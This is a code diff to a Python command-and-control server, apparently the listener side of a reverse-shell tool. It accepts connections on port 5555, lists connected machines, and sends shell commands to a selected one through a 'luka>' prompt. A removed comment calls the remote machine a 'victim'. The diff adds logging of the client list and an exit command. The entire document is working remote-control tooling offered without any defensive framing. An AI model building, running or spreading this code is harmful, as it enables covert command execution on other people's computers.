@@ -2,6 +2,7 @@
 
 import socket
 import sys
+import os
 import threading
 import time
 from queue import Queue
@@ -20,6 +21,11 @@ print(''
 '\n******************************************************************\n')
 '''
 
+# write data to a log file
+def write(data):
+    with open('log.txt', 'a') as f:
+        f.write(data)
+
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
@@ -32,7 +38,7 @@ def create_socket():
         global host
         global port
         global s
-        host = "0.0.0.0"
+        host = ""
         port = 5555
         s = socket.socket()
 
@@ -59,7 +65,6 @@ def bind_socket():
 # accept multiple connections
 # save them to a list
 # close previous connections upon server file restart
-
 def accepting_connections():
     for c in all_connections:
         c.close()
@@ -82,25 +87,29 @@ def accepting_connections():
             print("error accepting connections")
 
 
-# Interactive prompt for sending commands
 
+
+
+
+# interactive prompt
 def start_luka():
-
+    
     while True:
         cmd = input('luka> ')
         if cmd == 'list':
-            list_connections()
+            x = list_connections()
+            write(x)
+        elif 'exit' in cmd:
+            sys.exit()
         elif 'select' in cmd:
             conn = get_target(cmd)
             if conn is not None:
                 send_target_commands(conn)
-
         else:
             print("command not recognized")
 
 
-# Display all current active connections with client
-
+# display list of connections with client
 def list_connections():
     results = ''
 
@@ -113,28 +122,30 @@ def list_connections():
             del all_address[i]
             continue
 
-        results += '| ' + str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + ' |' + "\n"
+        results += str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
 
-    print("\n-------clients-----------" + "\n" + results)
+    print("\n-----clients-----" + "\n" + results)
+    return "\n-----clients-----" + "\n" + results
+    #print("\n-------clients-----------" + "\n" + results)
+    #return "\n-------clients-----------" + "\n" + results
 
-
-# Selecting the target
+# select target
 def get_target(cmd):
     try:
-        target = cmd.replace('select ', '')  # target = id
+        target = cmd.replace('select ', '')  # select [target id]
         target = int(target)
         conn = all_connections[target]
         print("you are now connected to: " + str(all_address[target][0]))
         print(str(all_address[target][0]) + ">", end="")
         return conn
-        # 192.168.0.4> dir
+        # 192.168.0.4> ls
 
     except:
         print("selection not valid")
         return None
 
 
-# Send commands to client/victim or a friend
+# send commands to client
 def send_target_commands(conn):
     while True:
         try:
@@ -152,7 +163,7 @@ def send_target_commands(conn):
             break
 
 
-# Create worker threads
+# worker threads
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=work)
@@ -160,7 +171,7 @@ def create_workers():
         t.start()
 
 
-# Do next job that is in the queue (handle connections, send commands)
+# queue that handle connections and send commands
 def work():
     while True:
         x = queue.get()
@@ -180,6 +191,6 @@ def create_jobs():
 
     queue.join()
 
-
 create_workers()
 create_jobs()
+sys.exit()
